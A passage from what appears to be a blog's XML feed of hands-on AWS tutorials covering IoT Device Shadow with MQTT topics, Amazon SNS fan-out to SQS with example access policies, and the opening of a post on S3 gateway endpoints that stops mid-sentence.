plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install ./aws-iot-device-sdk-python-v2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/aws-iot-device-sdk-python-v2/samples</span><br></pre></td></tr></table></figure><h2 id="Execute-the-shadow-py"><a href="#Execute-the-shadow-py" class="headerlink" title="Execute the shadow.py"></a>Execute the shadow.py</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 shadow.py --ca_file ~/certs/Amazon-root-CA-1.pem --cert ~/certs/device.pem.crt --key ~/certs/private.pem.key --endpoint your-iot-endpoint --thing_name your-iot-thing-name</span><br></pre></td></tr></table></figure><blockquote><p>You can derive the iot endpoint by checking the AWS IoT Console<br>Find the <strong>Connect</strong> &gt; <strong>Connect One Device</strong> in the left pane<br>Scroll down and you will see the IoT endpoint</p></blockquote><p><img src="https://i.imgur.com/mDBpV7l.png" alt="Imgur"></p><p>Back to the script, after you execute the <code>shadow.py</code>, you will see the prompt in your terminal</p><p><img src="https://i.imgur.com/necUKaZ.png" alt="Imgur"></p><p>You will need to enter the desired value. So I enter â€œyellowâ€.</p><p><img src="https://i.imgur.com/CQOkk83.png" alt="Imgur"></p><p>Then you can observe that the state changed to â€œyellowâ€. This results may also observe from the AWS IoT Console</p><blockquote><p>Go to Things, and select your thing object, on the bottem of the target thing page, you can navigate to the <strong>Device Shadow</strong> tab, then select the <strong>Classic Shadow</strong>, then you can see the Device Shadow State below</p></blockquote><p><img src="https://i.imgur.com/KTfooA1.png" alt="Imgur"></p><p><img src="https://i.imgur.com/Xcu4BKk.png" alt="Imgur"></p><p>For testing, I enter â€œgreenâ€ as the input of <code>shadow.py</code>.</p><p>And the state change show in both terminal and IoT Console</p><p><img src="https://i.imgur.com/AEEMMCa.png" alt="Imgur"></p><p><img src="https://i.imgur.com/BWi4UZh.png" alt="Imgur"></p><h2 id="Test-the-Shadow-Document"><a href="#Test-the-Shadow-Document" class="headerlink" title="Test the Shadow Document"></a>Test the Shadow Document</h2><p>Now you can try to edit the Shadow Document directly.</p><p>For example, I change the desired state from red to green.</p><p>Then you will notice that the change will reflect to the <strong>Delta report</strong>.</p><p><img src="https://i.imgur.com/9l40PXT.png" alt="Imgur"></p><h2 id="Test-with-AWS-IoT-Test-MQTT-Client"><a href="#Test-with-AWS-IoT-Test-MQTT-Client" class="headerlink" title="Test with AWS IoT Test MQTT Client"></a>Test with AWS IoT Test MQTT Client</h2><p>First, it is necessary to subscribe to the shadow topic in the MQTT client, for receiving the state change events.</p><p><img src="https://i.imgur.com/Zq4x4i8.png" alt="Imgur"></p><p>The client can subscribe to the topic</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$aws/things/ESP32/shadow/update/#</span><br></pre></td></tr></table></figure><p>The wildcard symbol <strong>â€œ#â€</strong> indicates that it wants to subscribe all topic under the <code>update/</code> prefix.</p><p>And you can re-run the program with new color value. You can find the MQTT client will receive the state change events.</p><p>At first, the color was â€œredâ€.</p><blockquote><p>The message published to $aws&#x2F;things&#x2F;ESP32&#x2F;shadow&#x2F;update&#x2F;document topic</p></blockquote><p>Then it changed to â€œgreenâ€.</p><blockquote><p> The message published to $aws&#x2F;things&#x2F;ESP32&#x2F;shadow&#x2F;update&#x2F;accepted topic<br>Noted that any unsuccessful messages were received on the topic $aws&#x2F;things&#x2F;ESP32&#x2F;shadow&#x2F;update&#x2F;rejected </p></blockquote><p><img src="https://i.imgur.com/brQ3knq.png" alt="Imgur"></p><h2 id="Edit-the-shadow-document-again"><a href="#Edit-the-shadow-document-again" class="headerlink" title="Edit the shadow document again"></a>Edit the shadow document again</h2><p>I change the desired stat value â€œblueâ€ to â€œblackâ€.</p><p><img src="https://i.imgur.com/DVKi6Xb.png" alt="Imgur"></p><p>The first received event will be on the delta topic, it means that there are differences between desired state and reported state.</p><p>At the same time, the message will published to the topic $aws&#x2F;things&#x2F;ESP32&#x2F;shadow&#x2F;update&#x2F;accepted for notifying the device to update the state</p><p><img src="https://i.imgur.com/7fewMie.png" alt="Imgur"></p><p>And also published to the shadow document topic for recording.</p><p><img src="https://i.imgur.com/FYULN43.png" alt="Imgur"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;previous&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;state&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699430576</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699430576</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">20</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;current&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;state&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;black&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699431256</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699431256</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">21</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699431256</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>But the reported state is not â€œBlackâ€.</p><p>you can see the event published to the accepted topic.</p><p><img src="https://i.imgur.com/pzVidVy.png" alt="Imgur"></p><p>Meanwhile, the message published to the document topic</p><p><img src="https://i.imgur.com/ZKmF0vG.png" alt="Imgur"></p><h2 id="Conclusions"><a href="#Conclusions" class="headerlink" title="Conclusions"></a>Conclusions</h2><p>You will found the state change from <strong>(Desired: â€œBlueâ€, Reported: â€œBlueâ€)</strong> to <strong>(Desired: â€œBlackâ€, Reported: â€œBlueâ€)</strong> and the final state is <strong>(Desired: â€œBlackâ€, Reported: â€œBlackâ€)</strong>.</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[+] Create a virtual device with Amazon EC2 - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/creating-a-virtual-thing.html">https://docs.aws.amazon.com/iot/latest/developerguide/creating-a-virtual-thing.html</a><br>[+] Tutorial: Provisioning your device in AWS IoT - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/shadow-provision-cloud.html">https://docs.aws.amazon.com/iot/latest/developerguide/shadow-provision-cloud.html</a><br>[+] Tutorial: Installing the Device SDK and running the sample application for Device Shadows - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/lightbulb-shadow-application.html">https://docs.aws.amazon.com/iot/latest/developerguide/lightbulb-shadow-application.html</a><br>[+] Tutorial: Interacting with Device Shadow using the sample app and the MQTT test client - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/interact-lights-device-shadows.html">https://docs.aws.amazon.com/iot/latest/developerguide/interact-lights-device-shadows.html</a><br>[+] Reserved topics - Shadow topics - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/reserved-topics.html#reserved-topics-shadow">https://docs.aws.amazon.com/iot/latest/developerguide/reserved-topics.html#reserved-topics-shadow</a></p>]]></content>
      
      
      <categories>
          
          <category> å¯¦ä½œç´€éŒ„ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> IoT Core </tag>
            
            <tag> IoT Shadow </tag>
            
            <tag> MQTT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hands-On Practice: Amazon SNS Fan out to Amazon SQS</title>
      <link href="/posts/efc78ef4.html"/>
      <url>/posts/efc78ef4.html</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Amazon SNS offen works well with Amazon SQS, by subscribing SQS to SNS, the SNS service can push messages to SQS. <strong>This may eliminating the need to periodically check or â€œpollâ€ for updates.</strong></p><h3 id="What-is-Amazon-SQS"><a href="#What-is-Amazon-SQS" class="headerlink" title="What is Amazon SQS?"></a>What is Amazon SQS?</h3><p>By official definition</p><blockquote><p>Amazon SQS is a message queue service used by distributed applications to exchange messages through a polling model, and can be used to decouple sending and receiving componentsâ€”without requiring each component to be concurrently available. </p></blockquote><h2 id="Scenario"><a href="#Scenario" class="headerlink" title="Scenario"></a>Scenario</h2><blockquote><p>The <strong>Fanout</strong> scenario is when a message published to an SNS topic is replicated and pushed to multiple endpoints, such as Kinesis Data Firehose delivery streams, Amazon SQS queues, HTTP(S) endpoints, and Lambda functions. This allows for parallel asynchronous processing.<br>For example, you can develop an application that publishes a message to an SNS topic whenever an order is placed for a product. Then, SQS queues that are subscribed to the SNS topic receive identical notifications for the new order. An Amazon Elastic Compute Cloud (Amazon EC2) server instance attached to one of the SQS queues can handle the processing or fulfillment of the order. And you can attach another Amazon EC2 server instance to a data warehouse for analysis of all orders received.[1]</p></blockquote><h2 id="Steps"><a href="#Steps" class="headerlink" title="Steps"></a>Steps</h2><p>Here we will go through each step of fan out to Amazon SQS.</p><p>The initial step is to remember both SNS arn and SQS arn.</p><h3 id="Create-SQS-Queue"><a href="#Create-SQS-Queue" class="headerlink" title="Create SQS Queue"></a>Create SQS Queue</h3><p>First, youâ€™ll need to create a standard queue in SQS console</p><p><img src="https://i.imgur.com/RRffWm5.png" alt="Imgur"></p><p>After creating the standard queue, it will shows the arn.</p><p>Make sure noted this arn, youâ€™ll need to provide this arn when creating the subscriptions</p><h3 id="Create-SNS-Topic"><a href="#Create-SNS-Topic" class="headerlink" title="Create SNS Topic"></a>Create SNS Topic</h3><p>Second, you need to create a SNS topic in the SNS console..</p><p><img src="https://i.imgur.com/ygA6g1P.png" alt="Imgur"></p><p>And again, youâ€™ll need to note the topic arn.</p><h3 id="Provide-Permission-to-SNS-to-send-messages-to-SQS"><a href="#Provide-Permission-to-SNS-to-send-messages-to-SQS" class="headerlink" title="Provide Permission to SNS to send messages to SQS"></a>Provide Permission to SNS to send messages to SQS</h3><p>By default, SNS will not have permission to send messages to SQS, so you need to provide permission to SNS for sending messages.</p><ul><li>Go to SQS Console</li><li>Press â€œEditâ€ in the top corner</li><li>Scroll down to the â€œAccess Policyâ€</li></ul><p><img src="https://i.imgur.com/keRSRlR.png" alt="Imgur"></p><ul><li>Append new statement in the Access Policy</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Service&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sns.amazonaws.com&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;sqs:DeleteMessage&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;sqs:ReceiveMessage&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;sqs:SendMessage&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sqs:us-east-1:xxxxxxxxxxxx:QueueforSNS&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;ArnEquals&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;aws:SourceArn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sns:us-east-1:xxxxxxxxxxxx:StandardTopicforSQS&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/UWjKND7.png" alt="Imgur"></p><h3 id="Subscribe-SQS-queue-to-SNS-topic"><a href="#Subscribe-SQS-queue-to-SNS-topic" class="headerlink" title="Subscribe SQS queue to SNS topic"></a>Subscribe SQS queue to SNS topic</h3><p>Now youâ€™ll need to subscribe the SQS queue to the SNS topic.</p><ul><li>Go to SNS console</li><li>Scroll down and choose â€œCreate Subscriptionâ€</li></ul><p><img src="https://i.imgur.com/qTEPbQb.png" alt="Imgur"></p><ul><li>Choose your topic arn</li><li>Set the protocal to SQS</li><li>Choose the SQS arn</li></ul><p><img src="https://i.imgur.com/voJqHuB.png" alt="Imgur"></p><p>Once complete, you will notice that the subscripe confirmation also completes. If you create a SQS type subscription by using console, you donâ€™t need confirm the subscription manually.</p><p><img src="https://i.imgur.com/Jr4Brob.png" alt="Imgur"></p><blockquote><p><strong>But if you create a cross-account subscription, you will receive the confirmation url in the SQS queue, and you will need to click the confirmation URL. [3]</strong></p></blockquote><h3 id="Provide-Permission-to-User-for-topic-x2F-queue-operations"><a href="#Provide-Permission-to-User-for-topic-x2F-queue-operations" class="headerlink" title="Provide Permission to User for topic&#x2F;queue operations"></a>Provide Permission to User for topic&#x2F;queue operations</h3><p>You can add permissions to an IAM User to publish SNS messages to a topic.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sns:Publish&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sns:us-east-2:XXXXXXXXXXXX:MyTopic&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>And you also need to provide permissions to SQS queue to recieve and delete messages</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;sqs:ReceiveMessage&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;sqs:DeleteMessage&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:sqs:us-east-2:XXXXXXXXXXXX:MyQueue1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:sqs:us-east-2:XXXXXXXXXXXX:MyQueue2&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>However,if you want to perform cross-account operations, you will need to provide permissions to the other account.</p><p>For example, if you want to let acount: 111122223333 to publish messages to SNS topic in your account, here is an example policy.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;AWS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;111122223333&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sns:Publish&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sns:us-east-2:XXXXXXXXXXXXX:MyTopic&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>if you want to let acount: 111122223333 to perform receive abd delete messages to queue in your account, here is an example policy.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;AWS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;111122223333&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;sqs:DeleteMessage&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;sqs:ReceiveMessage&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:sqs:us-east-2:XXXXXXXXXXXX:MyQueue&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Test-subscription"><a href="#Test-subscription" class="headerlink" title="Test subscription"></a>Test subscription</h3><p>Now we can test the message delivery to the queue.</p><ul><li>Go to the SNS console</li><li>Press â€œPush Messageâ€ in the top right corner </li><li>Enter the message subject and meesage body</li></ul><p><img src="https://i.imgur.com/iu7VJVX.png" alt="Imgur"><br><img src="https://i.imgur.com/ppgfOf0.png" alt="Imgur"></p><ul><li>Go to the SQS console</li><li>Press â€œSend and Receive Messageâ€ in the top right corner</li><li>Scroll down , and press the â€œPoll for all messagesâ€</li><li>And youâ€™ll find the messages are in polling progress.</li></ul><p><img src="https://i.imgur.com/aYWXVIE.png" alt="Imgur"></p><ul><li>Then the test meesages showed in the console</li></ul><p><img src="https://i.imgur.com/Vj3cCc9.png" alt="Imgur"></p><h2 id="Conclusions"><a href="#Conclusions" class="headerlink" title="Conclusions"></a>Conclusions</h2><p>We successfully fan out the message from the Amazon SNS to the Amazon SQS. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://docs.aws.amazon.com/sns/latest/dg/sns-common-scenarios.html#SNSFanoutScenario">https://docs.aws.amazon.com/sns/latest/dg/sns-common-scenarios.html#SNSFanoutScenario</a><br>[2] <a href="https://docs.aws.amazon.com/zh_tw/sns/latest/dg/sns-sqs-as-subscriber.html">https://docs.aws.amazon.com/zh_tw/sns/latest/dg/sns-sqs-as-subscriber.html</a><br>[3]<a href="https://docs.aws.amazon.com/zh_tw/sns/latest/dg/sns-send-message-to-sqs-cross-account.html">https://docs.aws.amazon.com/zh_tw/sns/latest/dg/sns-send-message-to-sqs-cross-account.html</a></p>]]></content>
      
      
      <categories>
          
          <category> å¯¦ä½œç´€éŒ„ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> SNS </tag>
            
            <tag> SQS </tag>
            
            <tag> Publish-Subscribe-Model </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hands-On Practice: S3 Gateway Endpoints</title>
      <link href="/posts/e7e295f6.html"/>
      <url>/posts/e7e295f6.html</url>
      
        <content type="html"><![CDATA[<h1 id="What-is-S3-Gateway-Endpoints"><a href="#What-is-S3-Gateway-Endpoints" class="headerlink" title="What is S3 Gateway Endpoints?"></a>What is S3 Gateway Endpoints?</h1><p><img src="https://i.imgur.com/MUsKNi4.png" alt="Imgur"></p><p>Letâ€™s consider a scenario</p><blockquote><p>How could your Lambda function access the content in the S3 bucket?</p></blockquote><p>If you want a service to access the content in the S3 bucket, it usually go through VPC endpoint. S3 supports two types of VPC endpoint,each of which is <strong>Gateway endpoint</strong> and <strong>Interface endpoint</strong></p><!--å¦‚æœè¦é€šéä¸€å€‹æœå‹™ä¾†å­˜å– S3 ç•¶ä¸­çš„å…§å®¹ï¼Œé€šå¸¸æ˜¯æœƒé€šé VPC Endpointï¼Œè€Œåœ¨ S3 ç•¶ä¸­åˆæ”¯æ´å…©ç¨®ä¸åŒçš„ VPC Endpointé¡å‹ï¼Œåˆ†åˆ¥æ˜¯ **Gateway Endpoint** ä»¥åŠ **Interface Endpoint**--><p>The diffeences between two types of VPC endpoints are listed below</p><table><thead><tr><th>S3 Gateway Endpoints</th><th>S3 Interface Endpoints</th></tr></thead><tbody><tr><td>Use S3 Public IP Address</td><td>Use Private IP Address in VPC to access S3</td></tr><tr><td>Use the same S3 DNS Name</td><td>Name must include VPC Endpoint ID [3]</td></tr><tr><td>cannot access internally</td><td>can access internally</td></tr><tr><td>cannot access from other AWS region</td><td>can access from other AWS region by using VPC peering or AWS Transit gateway</td></tr><tr><td>Free</td><td>In chrarge</td></tr></tbody></table><!-- >> **æ‰€ä»¥ç•¶ä½ çš„æƒ…å¢ƒæ˜¯ä½ åœ¨åŒå€‹ Region åº•ä¸‹æœ‰å€‹ Lambda å‡½æ•¸æƒ³è¦å­˜å– S3 çš„å…§å®¹ï¼Œé‚£å°±å¾ˆé©åˆä½¿ç”¨ Gateway Endpoint** --><blockquote><p>So if your scenario is that a Lambda function want to access the content in S3 bucket in the same region, it is great to utilize the Gateway Endpoint</p></blockquote><h2 id="Consideration-of-S3-Gateway-Endpoint"><a href="#Consideration-of-S3-Gateway-Endpoint" class="headerlink" title="Consideration of S3 Gateway Endpoint"></a>Consideration of S3 Gateway Endpoint</h2><p>It is worth to mestion that there are several things you need to consider before choosing S3 Gateway Endpoints, make sure you go through the 